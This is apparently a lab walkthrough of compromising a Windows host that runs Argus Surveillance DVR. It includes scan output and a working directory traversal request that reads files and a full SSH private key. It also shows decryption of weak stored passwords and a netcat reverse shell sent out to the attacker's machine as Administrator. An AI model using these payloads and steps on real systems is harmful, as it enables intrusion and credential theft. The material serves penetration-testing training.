## NMAP
```
PORT      STATE SERVICE       REASON          VERSION
22/tcp    open  ssh           syn-ack ttl 125 Bitvise WinSSHD 8.48 (FlowSsh 8.48; protocol 2.0; non-commercial use)
| ssh-hostkey: 
|   3072 21:25:f0:53:b4:99:0f:34:de:2d:ca:bc:5d:fe:20:ce (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCsljcHdJN7STx92SFZR/dtzDsO0v1blAoUfqWva1WJD9WXeKe0S9Oeg4L1eXC6ik5O6+lE7SRqz7Qiudrhk9CXxB0tmmX2SpZKMg1l01wmO5QEhpeuhDOb062dCDc1byOkpbBJq93afwVOEiaCOMVVjnwvJ5MFmZQzBcb02rmHKH7+o2BjMukTA8coWhCc2cqyEgPA031zSYCkdzxLlgHJMUlbDDtD0D143rLPZ6CtP5Nbxpbt/2Hj3thq7GQzToNdgCYCEIMg6Gs4xYHLO4lKcOb92wFdEtx+hA7xFxGOldfmEU4f3jyDSFazolJU4TxzewQ/kIi1W4Cj+tarEVTC6sBUAhHZSLAj5nkz7rljJIXiM8hYp6VMcpsqa1dtlwspeiFXL2RizuQgUzabzsQGmZ0Yu501ieYy1i7mIEWzO2UUx3tnCn9YKAh30jYQQvXYB+oUGuQqDIQh1f0Ds/Jd1IkFMJ8EZQ8Iaoa1UVpxupdZ8jtBm3BKT5+sVtJ4jwE=
|   384 e7:96:f3:6a:d8:92:07:5a:bf:37:06:86:0a:31:73:19 (ECDSA)
|_ecdsa-sha2-nistp384 AAAAE2VjZHNhLXNoYTItbmlzdHAzODQAAAAIbmlzdHAzODQAAABhBEqSs/ONYXuZGcGBUkLstnAWRP6wNsuJz6yUtmYymbBUobb797y3tkgWkCUhaDsB3z8XzhgoyCXS6MuXqF3FmiapitvPj1ig5TnVnHRvzuB2beKi/cH2XBduyaaKO6AORg==
135/tcp   open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 125 Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds? syn-ack ttl 125
5040/tcp  open  unknown       syn-ack ttl 125
7680/tcp  open  tcpwrapped    syn-ack ttl 125
8080/tcp  open  http-proxy    syn-ack ttl 125
| fingerprint-strings: 
|   GetRequest, HTTPOptions: 
|     HTTP/1.1 200 OK
|     Connection: Keep-Alive
|     Keep-Alive: timeout=15, max=4
|     Content-Type: text/html
|     Content-Length: 985
|     <HTML>
|     <HEAD>
|     <TITLE>
|     Argus Surveillance DVR
|     </TITLE>
|     <meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1">
|     <meta name="GENERATOR" content="Actual Drawing 6.0 (http://www.pysoft.com) [PYSOFTWARE]">
|     <frameset frameborder="no" border="0" rows="75,*,88">
|     <frame name="Top" frameborder="0" scrolling="auto" noresize src="CamerasTopFrame.html" marginwidth="0" marginheight="0"> 
|     <frame name="ActiveXFrame" frameborder="0" scrolling="auto" noresize src="ActiveXIFrame.html" marginwidth="0" marginheight="0">
|     <frame name="CamerasTable" frameborder="0" scrolling="auto" noresize src="CamerasBottomFrame.html" marginwidth="0" marginheight="0"> 
|     <noframes>
|     <p>This page uses frames, but your browser doesn't support them.</p>
|_    </noframes>
|_http-favicon: Unknown favicon MD5: 283B772C1C2427B56FC3296B0AF42F7C
|_http-title: Argus Surveillance DVR
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-generator: Actual Drawing 6.0 (http://www.pysoft.com) [PYSOFTWARE]
49664/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
49665/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
49666/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
49668/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
49669/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
```

## SMB
```
┌──(kali㉿kali)-[~/Desktop/Pen200/DVR4]
└─$ nxc smb 192.168.187.179 -u anonymous -p anonymous --shares
SMB         192.168.187.179 445    DVR4             [*] Windows 10 / Server 2019 Build 19041 x64 (name:DVR4) (domain:DVR4) (signing:False) (SMBv1:None)
SMB         192.168.187.179 445    DVR4             [-] DVR4\anonymous:anonymous STATUS_LOGON_FAILURE
```

## 8080 HTTP
Didn't required login
![image](https://hackmd.io/_uploads/rkSLGw4YWx.png)
![image](https://hackmd.io/_uploads/H14w7vVK-g.png)
![image](https://hackmd.io/_uploads/S1Z9LDVYWx.png)
```
┌──(kali㉿kali)-[~/Desktop/Pen200/DVR4]
└─$ curl "http://192.168.187.179:8080/WEBACCOUNT.CGI?OkBtn=++Ok++&RESULTPAGE=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2Fsystem.ini&USEREDIRECT=1&WEBACCOUNTID=&WEBACCOUNTPASSWORD="
; for 16-bit app support
[386Enh]
woafont=dosapp.fon
EGA80WOA.FON=EGA80WOA.FON
EGA40WOA.FON=EGA40WOA.FON
CGA80WOA.FON=CGA80WOA.FON
CGA40WOA.FON=CGA40WOA.FON

[drivers]
wave=mmdrv.dll
timer=timer.drv

[mci]
```

* CVE-2018-15745
![image](https://hackmd.io/_uploads/HkgyTP4tbe.png)
```
┌──(kali㉿kali)-[~/Desktop/Pen200/DVR4]
└─$ ./exploit.sh                     

▄▖          ▄▖        ▘▜ ▜           ▄ ▖▖▄▖▖▖
▌▌▛▘▛▌▌▌▛▘  ▚ ▌▌▛▘▌▌█▌▌▐ ▐ ▀▌▛▌▛▘█▌  ▌▌▌▌▙▘▙▌
▛▌▌ ▙▌▙▌▄▌  ▄▌▙▌▌ ▚▘▙▖▌▐▖▐▖█▌▌▌▙▖▙▖  ▙▘▚▘▌▌ ▌
    ▄▌                                       

Enter Target-Host IP Address
192.168.187.179
Enter Target-Host Port: 
8080
Enter the Directory (e.g. C:\Windows\system.ini): 
C:\ProgramData\PY_Software\Argus Surveillance DVR\DVRParams.ini
[Main]
ServerName=
ServerLocation=
ServerDescription=
ReadH=0
UseDialUp=0
DialUpConName=
DialUpDisconnectWhenDone=0
DIALUPUSEDEFAULTS" checked checked

Enter the Directory (e.g. C:\Windows\system.ini): 
%userprofile%\.ssh\id_rsa
<HTML><HEAD><TITLE>File Not Found</TITLE></HEAD><BODY><H1>Cannot find this file.</H1>The requested file: <B>/WEBACCOUNT.CGI?OkBtn=  Ok  &RESULTPAGE=../../../../../../../../../../erprofile%/.ssh/id_rsa&USEREDIRECT=1&WEBACCOUNTID=&WEBACCOUNTPASSWORD=</B> was not found.</BODY></HTML>
Enter the Directory (e.g. C:\Windows\system.ini): 
C:\Users\Administrator\.ssh\id_rsa
<HTML><HEAD><TITLE>File Not Found</TITLE></HEAD><BODY><H1>Cannot find this file.</H1>The requested file: <B>/WEBACCOUNT.CGI?OkBtn=  Ok  &RESULTPAGE=../../../../../../../../../../Users/Administrator/.ssh/id_rsa&USEREDIRECT=1&WEBACCOUNTID=&WEBACCOUNTPASSWORD=</B> was not found.</BODY></HTML>
Enter the Directory (e.g. C:\Windows\system.ini): 
C:\Users\Administrator\.ssh\id_ed25519
<HTML><HEAD><TITLE>File Not Found</TITLE></HEAD><BODY><H1>Cannot find this file.</H1>The requested file: <B>/WEBACCOUNT.CGI?OkBtn=  Ok  &RESULTPAGE=../../../../../../../../../../Users/Administrator/.ssh/id_ed25519&USEREDIRECT=1&WEBACCOUNTID=&WEBACCOUNTPASSWORD=</B> was not found.</BODY></HTML>
Enter the Directory (e.g. C:\Windows\system.ini): 
C:\Users\Administrator\.ssh\id_ecdsa
<HTML><HEAD><TITLE>File Not Found</TITLE></HEAD><BODY><H1>Cannot find this file.</H1>The requested file: <B>/WEBACCOUNT.CGI?OkBtn=  Ok  &RESULTPAGE=../../../../../../../../../../Users/Administrator/.ssh/id_ecdsa&USEREDIRECT=1&WEBACCOUNTID=&WEBACCOUNTPASSWORD=</B> was not found.</BODY></HTML>
Enter the Directory (e.g. C:\Windows\system.ini): 
C:\Users\Administrator\desktop\proof.txt
288a1ce9ddd016cf28833ebb2be12a41


Enter the Directory (e.g. C:\Windows\system.ini): 
C:\Windows\system.ini
; for 16-bit app support
[386Enh]
woafont=dosapp.fon
EGA80WOA.FON=EGA80WOA.FON
EGA40WOA.FON=EGA40WOA.FON
CGA80WOA.FON=CGA80WOA.FON
CGA40WOA.FON=CGA40WOA.FON

[drivers]
wave=mmdrv.dll
timer=timer.drv

[mci]




Enter the Directory (e.g. C:\Windows\system.ini): 
C:\users\viewer\.ssh\id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
```

* ssh
```
┌──(kali㉿kali)-[~/Desktop/Pen200/DVR4]
└─$ nano key                                                  
                                                                                                                                                                                  
┌──(kali㉿kali)-[~/Desktop/Pen200/DVR4]
└─$ chmod 0600 key          
                                                                                                                                                                                  
┌──(kali㉿kali)-[~/Desktop/Pen200/DVR4]
└─$ ssh -i key viewer@192.168.187.179 
The authenticity of host '192.168.187.179 (192.168.187.179)' can't be established.
ECDSA key fingerprint is: SHA256:0zp+uR1SK5UOIuXmUFyBv6zUowYGwzY44kFpPaahWzs
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.187.179' (ECDSA) to the list of known hosts.
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
Microsoft Windows [Version 10.0.19044.1645]
(c) Microsoft Corporation. All rights reserved.

C:\Users\viewer>whoami /all

USER INFORMATION
----------------

User Name   SID                                           
=========== ==============================================
dvr4\viewer S-1-5-21-2619112490-2635448554-1147358759-1002


GROUP INFORMATION
-----------------

Group Name                             Type             SID          Attributes                                        
====================================== ================ ============ ==================================================
Everyone                               Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                          Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                   Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users       Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization         Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account             Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level Label            S-1-16-8192                                                    


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                          State  
============================= ==================================== =======
SeShutdownPrivilege           Shut down the system                 Enabled
SeChangeNotifyPrivilege       Bypass traverse checking             Enabled
SeUndockPrivilege             Remove computer from docking station Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set       Enabled
SeTimeZonePrivilege           Change the time zone                 Enabled


C:\Users\viewer>
```


* Privilege Escalation
```
PS C:\Program Files\Argus Surveillance DVR> Get-ChildItem -Path C:\ -Include *.ini -File -Force -Recurse -ErrorAction SilentlyContinue | where-Object { $_.FullName -notmatch 'C:\\Windows\\' -and $_.Name -notin 'desktop.ini','ntuser.ini' }


    Directory: C:\Program Files\Argus Surveillance DVR

Mode                 LastWriteTime         Length Name                                                                                                                                                                                                                                                                                                                  
----                 -------------         ------ ----                                                                                                                                                                                                                                                                                                                  
-a----         7/30/2007   6:34 PM             33 CommonSettings.ini                                                                                                                                                                                                                                                                                                    
-a----         12/3/2021  12:29 AM             58 Viewer.ini                                                                                                                                                                                                                                                                                                            
                                                                                                                                                                                                                                                                                                                                                                        
                                                                                                                                                                                                                                                                                                                                                                        
    Directory: C:\ProgramData\Microsoft OneDrive\setup

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         4/15/2022   7:07 AM             25 refcount.ini


    Directory: C:\ProgramData\PY_Software\Argus Surveillance DVR


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----          3/3/2026   6:54 AM           5927 DVRParams.ini


    Directory: C:\Users\All Users\Microsoft OneDrive\setup

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         4/15/2022   7:07 AM             25 refcount.ini
    Directory: C:\Users\All Users\PY_Software\Argus Surveillance DVR


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----          3/3/2026   6:54 AM           5927 DVRParams.ini


    Directory: C:\Users\Default\AppData\Local\Microsoft\Windows Sidebar


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         12/7/2019   1:12 AM             80 settings.ini


    Directory: C:\Users\viewer\AppData\Local\Microsoft\Windows Sidebar


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         12/7/2019   1:12 AM             80 settings.ini
```

```
PS C:\Program Files\Argus Surveillance DVR> type "C:\ProgramData\PY_Software\Argus Surveillance DVR\DVRParams.ini"                                                                                                                                                                                                                                                      
[Main]
ServerName=

...

Password0=ECB453D16069F641E03BD9BD956BFE36BD8F3CD9D9A8
Description0=60CAAAFEC8753F7EE03B3B76C875EB607359F641D9BDD9BD8998AAFEEB60E03B7359E1D08998CA797359F641418D4D7BC875EB60C8759083E03BB740CA79C875EB603CD97359D9BDF6414D7BB740CA79F6419083

...

Password1=5E534D7B6069F641E03BD9BD956BC875EB603CD9D8E1BD8FAAFE
```
https://github.com/s3l33/CVE-2022-25012/blob/main/CVE-2022-25012.py
![image](https://hackmd.io/_uploads/r1CgiuNY-x.png)
```
┌──(kali㉿kali)-[~/Desktop/Pen200/DVR4]
└─$ python3 50130.py ECB453D16069F641E03BD9BD956BFE36BD8F3CD9D9A8
/home/kali/Desktop/Pen200/DVR4/50130.py:48: SyntaxWarning: invalid escape sequence '\_'
  #   /  _  \_______  ____  __ __  ______ #

#########################################
#    _____ Surveillance DVR 4.0         #
#   /  _  \_______  ____  __ __  ______ #
#  /  /_\  \_  __ \/ ___\|  |  \/  ___/ #
# /    |    \  | \/ /_/  >  |  /\___ \  #
# \____|__  /__|  \___  /|____//____  > #
#         \/     /_____/            \/  #
#        Weak Password Encryption       #
############ @deathflash1411 ############
#                                       #
# Updated by S3L33                      #
#########################################


[+] ECB4:1
[+] 53D1:4
[+] 6069:W
[+] F641:a
[+] E03B:t
[+] D9BD:c
[+] 956B:h
[+] FE36:D
[+] BD8F:0
[+] 3CD9:g
[+] D9A8:$

[+] Password: 14WatchD0g$
```
```
PS C:\Users\viewer> runas /user:Administrator "nc.exe 192.168.45.219 4444 -e powershell"                                                                                          
Enter the password for Administrator:                                                                                                                                             
Attempting to start nc.exe 192.168.45.219 4444 -e powershell as user "DVR4\Administrator" ...
```
```
──(kali㉿kali)-[~/Desktop/Pen200/DVR4]
└─$ nc -lvnp 4444             
listening on [any] 4444 ...
connect to [192.168.45.219] from (UNKNOWN) [192.168.187.179] 65242
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Try the new cross-platform PowerShell https://aka.ms/pscore6

PS C:\WINDOWS\system32> whoami /all
whoami /all

USER INFORMATION
----------------

User Name          SID                                          
================== =============================================
dvr4\administrator S-1-5-21-2619112490-2635448554-1147358759-500
```